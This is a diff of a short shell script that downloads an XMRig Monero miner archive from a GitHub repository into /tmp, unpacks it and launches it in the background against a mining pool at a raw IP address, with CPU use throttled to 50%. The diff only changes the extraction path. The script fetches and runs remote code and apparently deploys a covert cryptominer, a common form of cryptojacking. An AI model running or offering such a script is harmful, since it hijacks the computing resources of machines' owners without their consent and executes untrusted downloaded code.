@@ -1,5 +1,5 @@
 wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/xmr.tar.gz
-tar -xvzf ./tmp/xmr.tar.gz -C /tmp/
+tar -xvzf ./tmp/xmr.tar.gz -C ./tmp/
 cd /tmp/xmrig-6.14.1
 chmod +x /tmp/xmrig-6.14.1/xmrig
 /tmp/xmrig-6.14.1/xmrig -o 107.182.176.159:8989 -u worker3 -p xx -t 1 -B --cpu-priority 1 --cpu-max-threads-hint=50% --nicehash
